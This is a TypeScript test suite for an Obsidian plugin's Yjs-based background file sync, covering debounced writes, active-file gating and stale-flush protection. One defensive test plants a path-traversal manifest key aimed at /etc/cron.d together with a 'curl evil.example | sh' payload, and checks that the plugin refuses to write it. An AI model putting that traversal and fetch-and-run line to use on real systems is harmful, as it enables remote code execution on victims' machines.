import { TFile } from "obsidian";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import * as Y from "yjs";
import { BackgroundSync } from "../files/background-sync";

function mockFile(path: string) {
  const f = Object.create(TFile.prototype);
  f.path = path;
  f.stat = { size: 0, mtime: 0, ctime: 0 };
  return f;
}

function createVault() {
  return {
    getAbstractFileByPath: vi.fn(() => null),
    read: vi.fn(async () => ""),
    modify: vi.fn(async () => {}),
    create: vi.fn(async () => ({})),
    getFiles: vi.fn(() => []),
    createFolder: vi.fn(async () => ({})),
    adapter: {
      write: vi.fn(async () => {}),
      writeBinary: vi.fn(async () => {}),
    },
  } as any;
}

function createSyncManager() {
  const docs = new Map<string, { doc: Y.Doc; text: Y.Text; awareness: any }>();
  return {
    getDoc(path: string) {
      if (!docs.has(path)) {
        const doc = new Y.Doc();
        const text = doc.getText("content");
        const awareness = {
          setLocalStateField: vi.fn(),
          setLocalState: vi.fn(),
        };
        docs.set(path, { doc, text, awareness });
      }
      return docs.get(path)!;
    },
    releaseDoc(path: string) {
      const entry = docs.get(path);
      if (entry) {
        entry.doc.destroy();
        docs.delete(path);
      }
    },
    waitForSync: vi.fn(async () => {}),
    _docs: docs,
  } as any;
}

function createManifestManager(entries: Map<string, any> = new Map()) {
  return {
    getEntries: vi.fn(() => entries),
    isSharedPath: vi.fn(() => true),
    updateFile: vi.fn(async () => {}),
  } as any;
}

function createFileOpsManager() {
  return {
    mutePathEvents: vi.fn(),
    unmutePathEvents: vi.fn(),
    isPathMuted: vi.fn(() => false),
  } as any;
}

describe("BackgroundSync", () => {
  let vault: ReturnType<typeof createVault>;
  let syncManager: ReturnType<typeof createSyncManager>;
  let manifestManager: ReturnType<typeof createManifestManager>;
  let fileOpsManager: ReturnType<typeof createFileOpsManager>;
  let bg: BackgroundSync;

  beforeEach(() => {
    vi.useFakeTimers();
    vault = createVault();
    syncManager = createSyncManager();
    manifestManager = createManifestManager();
    fileOpsManager = createFileOpsManager();
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);
  });

  afterEach(() => {
    bg.destroy();
    vi.useRealTimers();
  });

  it("subscribes to all text files from manifest", async () => {
    const entries = new Map([
      ["notes/hello.md", { hash: "abc", size: 5, mtime: 1 }],
      ["notes/world.md", { hash: "def", size: 5, mtime: 1 }],
      ["images/photo.png", { hash: "ghi", size: 100, mtime: 1, binary: true }],
    ]);
    manifestManager = createManifestManager(entries);
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    expect(syncManager._docs.has("notes/hello.md")).toBe(true);
    expect(syncManager._docs.has("notes/world.md")).toBe(true);
    expect(syncManager._docs.has("images/photo.png")).toBe(false);
  });

  it("host seeds empty Y.Text from vault content", async () => {
    const entries = new Map([["test.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("test.md"));
    vault.read.mockResolvedValue("hello world");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    const { text } = syncManager.getDoc("test.md");
    expect(text.toString()).toBe("hello world");
  });

  it("host respects existing Y.Text from guests instead of overwriting", async () => {
    const entries = new Map([["test.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("test.md"));
    vault.read.mockResolvedValue("local content");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const { text } = syncManager.getDoc("test.md");
    text.insert(0, "existing remote content");

    await bg.startAll("host");

    // Y.Text keeps remote content - host does NOT overwrite it
    expect(text.toString()).toBe("existing remote content");
    // Instead the remote content is written to disk
    expect(vault.adapter.write).toHaveBeenCalledWith("test.md", "existing remote content");
  });

  it("guest writes remote Y.Text to vault if different from local", async () => {
    const entries = new Map([["test.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    const fakeFile = mockFile("test.md");
    vault.getAbstractFileByPath.mockReturnValue(fakeFile);
    vault.read.mockResolvedValue("old content");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const { text } = syncManager.getDoc("test.md");
    text.insert(0, "remote content");

    await bg.startAll("guest");
    vi.advanceTimersByTime(200);

    expect(vault.adapter.write).toHaveBeenCalledWith("test.md", "remote content");
  });

  it("refuses to write a manifest entry that escapes the vault (path traversal)", async () => {
    const evil = "../../../../etc/cron.d/pwn.sh";
    const entries = new Map([[evil, { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(null);
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    // A malicious host seeds attacker-controlled content for the traversal key.
    const { text } = syncManager.getDoc(evil);
    text.insert(0, "#!/bin/sh\ncurl evil.example | sh\n");

    await bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);

    // The traversal path must never reach the disk adapter.
    expect(vault.adapter.write).not.toHaveBeenCalled();
    expect(syncManager._docs.has(evil)).toBe(true); // doc may exist; disk write is what matters
    for (const call of vault.adapter.write.mock.calls) {
      expect(call[0]).not.toContain("..");
    }
  });

  it("flushes old active file to disk on switch", async () => {
    const entries = new Map([
      ["a.md", { hash: "abc", size: 5, mtime: 1 }],
      ["b.md", { hash: "def", size: 5, mtime: 1 }],
    ]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockImplementation((p: string) => mockFile(p));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    const { text: textA } = syncManager.getDoc("a.md");
    textA.delete(0, textA.length);
    textA.insert(0, "content of A");

    bg.setActiveFile("a.md");

    vault.adapter.write.mockClear();
    bg.setActiveFile("b.md");
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.adapter.write).toHaveBeenCalledWith("a.md", "content of A");
  });

  it("does not write to disk for the active file", async () => {
    const entries = new Map([["test.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("test.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("test.md");
    bg.setCollabBoundFile("test.md");
    vault.modify.mockClear();

    const { doc } = syncManager.getDoc("test.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "remote edit");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    vi.advanceTimersByTime(2000);

    expect(vault.modify).not.toHaveBeenCalled();
  });

  it("writes remote changes to disk after debounce", async () => {
    const entries = new Map([["bg.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("bg.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("other.md");
    vault.modify.mockClear();

    const { doc } = syncManager.getDoc("bg.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "background edit");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    expect(vault.modify).not.toHaveBeenCalled();

    vi.advanceTimersByTime(1100);
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.adapter.write).toHaveBeenCalledWith("bg.md", "background edit");
  });

  it("host pushes local text changes into Y.Doc", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    const fakeFile = mockFile("note.md");
    vault.getAbstractFileByPath.mockReturnValue(fakeFile);
    vault.read.mockResolvedValue("initial");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    vault.read.mockResolvedValue("updated externally");
    await bg.handleLocalTextModify("note.md");

    const { text } = syncManager.getDoc("note.md");
    expect(text.toString()).toBe("updated externally");
    expect(manifestManager.updateFile).toHaveBeenCalled();
  });

  it("handleLocalTextModify skips the active file", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("note.md"));
    vault.read.mockResolvedValue("initial");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");
    bg.setActiveFile("note.md");
    bg.setCollabBoundFile("note.md");

    vault.read.mockResolvedValue("edited");
    await bg.handleLocalTextModify("note.md");

    const { text } = syncManager.getDoc("note.md");
    expect(text.toString()).toBe("initial");
  });

  it("single-writer: active-file gate holds even before collabBoundFile is set", async () => {
    // Reproduces the Bug B race window: onActiveFileChange now marks the file
    // active synchronously, but collabBoundFile may still be racing. The gate on
    // active-file identity must already suppress background-sync so a disk-only
    // Properties-UI frontmatter write is NOT doubled into Y.Text.
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("note.md"));
    vault.read.mockResolvedValue("initial");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    // Active set synchronously; collabBoundFile intentionally NOT set yet.
    bg.setActiveFile("note.md");

    // yCollab is the single owner: it applies the new property exactly once.
    const { text } = syncManager.getDoc("note.md");
    text.insert(text.length, "\ntags: x");

    // The same edit also lands on disk (outside CM6) and fires a vault modify.
    vault.read.mockResolvedValue("initial\ntags: x");
    await bg.handleLocalTextModify("note.md");

    // Background-sync must not echo it -> the property appears exactly once.
    expect((text.toString().match(/tags: x/g) ?? []).length).toBe(1);
    expect(text.toString()).toBe("initial\ntags: x");
  });

  it("does not disk-echo the active file even when collabBoundFile is unset", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("note.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;

    bg.setActiveFile("note.md"); // collabBoundFile deliberately not set
    vault.adapter.write.mockClear();

    const { doc } = syncManager.getDoc("note.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "remote edit");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    vi.advanceTimersByTime(1000);
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.adapter.write).not.toHaveBeenCalled();
  });

  it("flushes background writes at the lowered ~300ms debounce", async () => {
    const entries = new Map([["bg.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("bg.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("other.md");
    vault.adapter.write.mockClear();

    const { doc } = syncManager.getDoc("bg.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "background edit");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    vi.advanceTimersByTime(150);
    await vi.advanceTimersByTimeAsync(0);
    expect(vault.adapter.write).not.toHaveBeenCalled();

    vi.advanceTimersByTime(200); // total 350ms > 300ms debounce
    await vi.advanceTimersByTimeAsync(0);
    expect(vault.adapter.write).toHaveBeenCalledWith("bg.md", "background edit");
  });

  it("handleLocalTextModify skips when writtenByUs", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("note.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    await bg.startAll("host");

    const { doc } = syncManager.getDoc("note.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "from remote");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    vi.advanceTimersByTime(1100);
    await vi.advanceTimersByTimeAsync(0);

    expect(bg.isRecentDiskWrite("note.md")).toBe(true);

    vault.read.mockResolvedValue("local edit during suppression");
    await bg.handleLocalTextModify("note.md");

    const { text } = syncManager.getDoc("note.md");
    expect(text.toString()).toBe("from remote");
  });

  it("guest pushes local text changes into Y.Doc but does not update manifest", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    const fakeFile = mockFile("note.md");
    vault.getAbstractFileByPath.mockReturnValue(fakeFile);
    vault.read.mockResolvedValue("initial");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    // Pre-seed Y.Text so subscribe doesn't trigger a disk write
    const { text: seedText } = syncManager.getDoc("note.md");
    seedText.insert(0, "initial");

    await bg.startAll("guest");

    vault.read.mockResolvedValue("updated by plugin");
    await bg.handleLocalTextModify("note.md");

    const { text } = syncManager.getDoc("note.md");
    expect(text.toString()).toBe("updated by plugin");
    expect(manifestManager.updateFile).not.toHaveBeenCalled();
  });

  it("onFileAdded subscribes a new text file", async () => {
    vault.getAbstractFileByPath.mockReturnValue(null);
    await bg.onFileAdded("new-file.md");

    expect(syncManager._docs.has("new-file.md")).toBe(true);
  });

  it("onFileAdded ignores binary files", async () => {
    await bg.onFileAdded("photo.png");
    expect(syncManager._docs.has("photo.png")).toBe(false);
  });

  it("onFileRemoved cleans up observer", async () => {
    const entries = new Map([["rm.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(null);
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;

    bg.onFileRemoved("rm.md");

    vault.modify.mockClear();
    const { doc } = syncManager.getDoc("rm.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "after removal");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    vi.advanceTimersByTime(2000);
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.modify).not.toHaveBeenCalled();
  });

  // Applies a delta to `doc` as a NON-LOCAL (remote) transaction, exactly as the
  // yjs sync protocol would when integrating an in-flight remote update.
  function applyRemoteDelta(doc: Y.Doc, buildDelta: (text: Y.Text) => void) {
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    buildDelta(remoteText);
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();
  }

  // --- WP4 / US5 AC1 (text path): version/sequence-gated flush ---

  it("WP4/US5-AC1: a stale local flush yields to an in-flight remote delta (remote survives)", async () => {
    const entries = new Map([["bg.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("bg.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("other.md"); // bg.md is a background file (observer active)
    vault.adapter.write.mockClear();

    // A whole-file flush was snapshotted at sequence 0 with now-stale content.
    // Before it reaches disk, an in-flight remote delta arrives and is integrated
    // into Y.Text (a non-local transaction bumps the per-file sequence to 1).
    const { doc, text } = syncManager.getDoc("bg.md");
    applyRemoteDelta(doc, (t) => t.insert(0, "remote survives"));

    // Now the stale snapshot (captured at seq 0) tries to flush.
    await (bg as any).writeToDisk("bg.md", "stale local snapshot", 0);
    await vi.advanceTimersByTimeAsync(0);

    // The stale snapshot must NOT clobber the remote change on disk.
    expect(vault.adapter.write).not.toHaveBeenCalledWith("bg.md", "stale local snapshot");
    // The remote change is intact in Y.Text and is what reaches disk.
    expect(text.toString()).toBe("remote survives");

    // The observer that integrated the remote delta scheduled its own flush of
    // the newer content; that write (sequence matches) is the one that lands.
    vi.advanceTimersByTime(600);
    await vi.advanceTimersByTimeAsync(0);
    expect(vault.adapter.write).toHaveBeenCalledWith("bg.md", "remote survives");
  });

  it("WP4/US5-AC1: a remote (non-local) delta advances the per-file sequence", async () => {
    const entries = new Map([["bg.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("bg.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;

    const { doc } = syncManager.getDoc("bg.md");
    expect((bg as any).currentSeq("bg.md")).toBe(0);

    applyRemoteDelta(doc, (t) => t.insert(0, "a"));
    expect((bg as any).currentSeq("bg.md")).toBe(1);

    applyRemoteDelta(doc, (t) => t.insert(1, "b"));
    expect((bg as any).currentSeq("bg.md")).toBe(2);
  });

  it("WP4/US5-AC1: a flush whose sequence still matches writes normally", async () => {
    const entries = new Map([["bg.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("bg.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("other.md");
    vault.adapter.write.mockClear();

    const { doc } = syncManager.getDoc("bg.md");
    applyRemoteDelta(doc, (t) => t.insert(0, "fresh"));
    const seq = (bg as any).currentSeq("bg.md");

    // No newer delta arrives; the snapshot sequence still matches -> write lands.
    await (bg as any).writeToDisk("bg.md", "fresh", seq);
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.adapter.write).toHaveBeenCalledWith("bg.md", "fresh");
  });

  it("WP4/US5-AC4: the version gate does not weaken single-writer active/collab gating", async () => {
    const entries = new Map([["note.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("note.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;

    bg.setActiveFile("note.md");
    bg.setCollabBoundFile("note.md");
    vault.adapter.write.mockClear();

    // A remote delta bumps the sequence, but the active/collab file must still
    // never be disk-echoed by background-sync (yCollab owns it).
    const { doc, text } = syncManager.getDoc("note.md");
    applyRemoteDelta(doc, (t) => t.insert(0, "remote edit"));
    expect((bg as any).currentSeq("note.md")).toBe(1); // sequence advanced...
    vi.advanceTimersByTime(2000);
    await vi.advanceTimersByTimeAsync(0);
    expect(vault.adapter.write).not.toHaveBeenCalled(); // ...but no disk echo

    // handleLocalTextModify still refuses to push a disk edit of the active file
    // into Y.Text (single-writer invariant intact).
    vault.read.mockResolvedValue("edited on disk");
    await bg.handleLocalTextModify("note.md");
    expect(text.toString()).toBe("remote edit");
  });

  it("destroy flushes pending debounced writes to disk", async () => {
    const entries = new Map([["flush.md", { hash: "abc", size: 5, mtime: 1 }]]);
    manifestManager = createManifestManager(entries);
    vault.getAbstractFileByPath.mockReturnValue(mockFile("flush.md"));
    vault.read.mockResolvedValue("");
    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);

    const startPromise = bg.startAll("guest");
    await vi.advanceTimersByTimeAsync(2100);
    await startPromise;
    bg.setActiveFile("other.md");
    vault.adapter.write.mockClear();

    const { doc } = syncManager.getDoc("flush.md");
    const remoteDoc = new Y.Doc();
    const remoteText = remoteDoc.getText("content");
    remoteText.insert(0, "pending content");
    Y.applyUpdate(doc, Y.encodeStateAsUpdate(remoteDoc));
    remoteDoc.destroy();

    // Debounced write is scheduled but not yet executed
    expect(vault.adapter.write).not.toHaveBeenCalled();

    // destroy() should flush the pending write immediately
    bg.destroy();
    await vi.advanceTimersByTimeAsync(0);

    expect(vault.adapter.write).toHaveBeenCalledWith("flush.md", "pending content");
  });
});
